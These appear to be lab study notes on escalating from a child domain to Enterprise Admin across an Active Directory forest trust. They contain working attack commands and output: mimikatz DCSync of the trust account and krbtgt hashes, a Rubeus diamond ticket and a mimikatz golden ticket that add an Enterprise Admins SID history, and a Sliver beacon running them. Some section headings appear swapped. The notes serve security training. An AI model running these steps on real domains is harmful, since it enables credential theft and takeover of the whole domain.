## Concept
### Domain Trust

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainTrust


SourceName      : child.htb.local
TargetName      : htb.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 9/14/2022 1:06:26 AM
WhenChanged     : 11/28/2023 4:37:20 PM



*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
dc01
```
### Domain Admins vs. Enterprise Admins

The [domain admin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins) (DA) has the highest privilege in a domain. Still, it does not have privileges outside the domain unless specific configurations (such as foreign security principal) are made in other domains. If the domain is a child domain in a forest, the [enterprise admin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#enterprise-admins) (EA) in the root domain has the highest privilege over the whole forest. In our case, `child\Administrator` and `child\carrot` are the domain admins in child.htb.local, while `htb\Administrator` is the enterprise admin in the entire forest.
### Foreign security principal

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainForeignUser
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK


UserDomain             : child.htb.local
UserName               : frank
UserDistinguishedName  : CN=frank,CN=Users,DC=child,DC=htb,DC=local
GroupDomain            : htb.local
GroupName              : Ext Admin
GroupDistinguishedName : CN=Ext Admin,OU=Groups,DC=htb,DC=local
```
### SID History

[SID history](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-sid-history-attribute) is an attribute that applies to migration scenarios. We know that SID is used to track the security principal and its access when requesting access to resources. SID history supports security principals in maintaining access to resources in the previous domain after a migration by adding their previous SIDs.
### Trust key

```sh
<SNIP>
mimikatz # lsadump::dcsync /user:child$
[DC] 'htb.local' will be the domain
[DC] 'dc02.htb.local' will be the DC server
[DC] 'child$' will be the user account

Object RDN           : CHILD$

** SAM ACCOUNT **

SAM Username         : CHILD$
Account Type         : 30000002 ( TRUST_ACCOUNT )
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Account expiration   :
Password last change : 2/12/2023 1:02:43 PM
Object Security ID   : S-1-5-21-264881711-3359223723-3458204895-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 87e9079c35246aa9522b99b710a4550a
<SNIP>
```
### Abuse Krbtgt

```sh
sliver (http-beacon) > sharpview -t 120 -- Get-DomainSid -Domain htb.local

[*] sharpview output:
[Get-DomainSearcher] search base: LDAP://DC01.CHILD.HTB.LOCAL/DC=htb,DC=local
[Get-DomainComputer] Using additional LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=8192)
[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192))
S-1-5-21-264881711-3359223723-3458204895
```

The Rubeus command should be as follows:

```sh
sliver (http-beacon) > inline-execute-assembly -t 120 /home/htb-ac-1008/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-264881711-3359223723-3458204895-519 /krbkey:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /nowrap"
```
### Trust Key

```sh
PS C:\Users\Administrator\Documents> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:CHILD\krbtgt
```

Upon successfully acquiring the NTLM hash for the `krbtgt` account, our next course of action entails employing `mimikatz` to execute the injection of the ticket into system memory through the utilization of the `kerberos::golden` module. Subsequently, we will employ a fabricated user, along with the domain security identifier (SID) of our current domain (`child.htb.local`) and the SID of the specific group (`Enterprise Admins`), as part of the process.

```sh
PS C:\Users\Administrator\Documents> .\mimikatz.exe

mimikatz # kerberos::golden /user:student /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /krbtgt:ec3e7210e3f08666c5d08c7ecbed1fab /sids:S-1-5-21-264881711-3359223723-3458204895-519 /ptt

mimikatz # exit

PS C:\Users\Administrator\Documents> klist
```